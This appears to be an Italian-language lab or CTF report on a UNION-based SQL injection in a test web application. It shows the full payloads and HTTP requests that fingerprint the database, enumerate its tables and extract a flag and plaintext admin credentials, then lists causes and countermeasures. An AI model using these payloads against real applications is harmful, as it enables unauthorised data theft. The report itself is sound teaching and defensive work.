============================================================
REPORT TECNICO – ANALISI VULNERABILITÀ SQL INJECTION
============================================================

============================================================
1. INTRODUZIONE
============================================================

Durante l’analisi di un’applicazione web di test, è stata individuata
una vulnerabilità di tipo SQL Injection sull’endpoint HTTP:

    /check?q=<input_utente>

La vulnerabilità consente a un attaccante di manipolare le query SQL
eseguite dal backend, ottenendo accesso non autorizzato ai dati del
database.


============================================================
2. DESCRIZIONE DELL’APPLICAZIONE
============================================================

L’applicazione interroga il database tramite una query del tipo:

    SELECT id, nome
    FROM utenti_pubblici
    WHERE id = <q>

Il parametro `q` viene fornito direttamente dall’utente tramite
query string HTTP e viene concatenato alla query SQL senza alcuna
validazione o sanitizzazione.

Questo comportamento rende l’applicazione vulnerabile a SQL Injection.


============================================================
3. IDENTIFICAZIONE DELLA VULNERABILITÀ
============================================================

È stato inviato il seguente payload:

    1 UNION SELECT database(), user()

Richiesta HTTP:

    http://10.8.0.15:32001/check?q=1%20UNION%20SELECT%20database(),%20user()

Query SQL risultante:

    SELECT id, nome
    FROM utenti_pubblici
    WHERE id = 1
    UNION
    SELECT database(), user();


------------------------------------------------------------
3.1 RISULTATO OTTENUTO
------------------------------------------------------------

    id      | nome
    -----------------------------
    1       | Mario Rossi
    cyber   | root@172.17.0.1


------------------------------------------------------------
3.2 ANALISI
------------------------------------------------------------

Il risultato dimostra che:

- L’iniezione SQL è eseguibile
- È possibile utilizzare UNION SELECT
- Il numero di colonne è corretto
- Il database si chiama "cyber"
- L’applicazione utilizza l’utente DB "root"

L’utilizzo dell’utente root rappresenta una grave violazione del
principio di least privilege.


============================================================
4. ENUMERAZIONE DELLE TABELLE
============================================================

Payload utilizzato:

    1 UNION SELECT table_name, 2
    FROM information_schema.tables
    WHERE table_schema = database()

Richiesta HTTP:

    http://10.8.0.15:32001/check?q=1%20UNION%20SELECT%20table_name,%202%20FROM%20information_schema.tables%20WHERE%20table_schema%20=%20database()

Query SQL risultante:

    SELECT id, nome
    FROM utenti_pubblici
    WHERE id = 1
    UNION
    SELECT table_name, 2
    FROM information_schema.tables
    WHERE table_schema = database();


------------------------------------------------------------
4.1 RISULTATO OTTENUTO
------------------------------------------------------------

    id              | nome
    --------------------------------
    1               | Mario Rossi
    items           | 2
    segreti         | 2
    users           | 2
    utenti_pubblici | 2


------------------------------------------------------------
4.2 ANALISI
------------------------------------------------------------

L’attaccante è riuscito a:

- Accedere allo schema informativo del database
- Enumerare tutte le tabelle presenti
- Identificare la tabella sensibile "segreti"


============================================================
5. ESTRAZIONE DEI DATI SENSIBILI
============================================================

Payload utilizzato:

    1 UNION SELECT titolo, valore FROM segreti

Richiesta HTTP:

    http://10.8.0.15:32001/check?q=1%20UNION%20SELECT%20titolo,valore%20FROM%20segreti

Query SQL risultante:

    SELECT id, nome
    FROM utenti_pubblici
    WHERE id = 1
    UNION
    SELECT titolo, valore
    FROM segreti;


------------------------------------------------------------
5.1 RISULTATO OTTENUTO
------------------------------------------------------------

    id                  | nome
    ----------------------------------------------
    1                   | Mario Rossi
    Flag1               | CTF{SQL_INJECTION_MASTER}
    Credenziali Admin   | admin:PasswordMoltoDifficile123


------------------------------------------------------------
5.2 IMPATTO
------------------------------------------------------------

La vulnerabilità ha permesso:

- Accesso a informazioni riservate
- Lettura di credenziali amministrative in chiaro
- Compromissione totale della confidenzialità dei dati
- Possibile accesso amministrativo all’applicazione


============================================================
6. CAUSE DELLA VULNERABILITÀ
============================================================

Le principali cause tecniche sono:

- Mancato utilizzo di prepared statements
- Assenza di validazione dell’input utente
- Utilizzo dell’utente root per l’accesso al database
- Nessuna protezione applicativa (WAF)
- Output diretto dei risultati SQL all’utente


============================================================
7. CLASSIFICAZIONE DEL RISCHIO
============================================================

- OWASP Top 10: A03:2021 – Injection
- Gravità: CRITICA
- Impatto: Compromissione completa del database
- Complessità dell’attacco: Bassa


============================================================
8. CONTROMISURE RACCOMANDATE
============================================================

Si raccomanda di:

- Utilizzare query parametrizzate (prepared statements)
- Validare e tipizzare correttamente gli input
- Usare un utente DB con privilegi minimi
- Disabilitare output SQL in produzione
- Implementare un Web Application Firewall
- Abilitare logging e monitoraggio degli attacchi


============================================================
9. CONCLUSIONE
============================================================

L’analisi dimostra come una SQL Injection di tipo UNION-based,
anche senza l’uso di strumenti avanzati, possa portare alla
compromissione totale di un’applicazione web.

La vulnerabilità evidenzia l’importanza di adottare misure di
sicurezza di base nello sviluppo di applicazioni web.
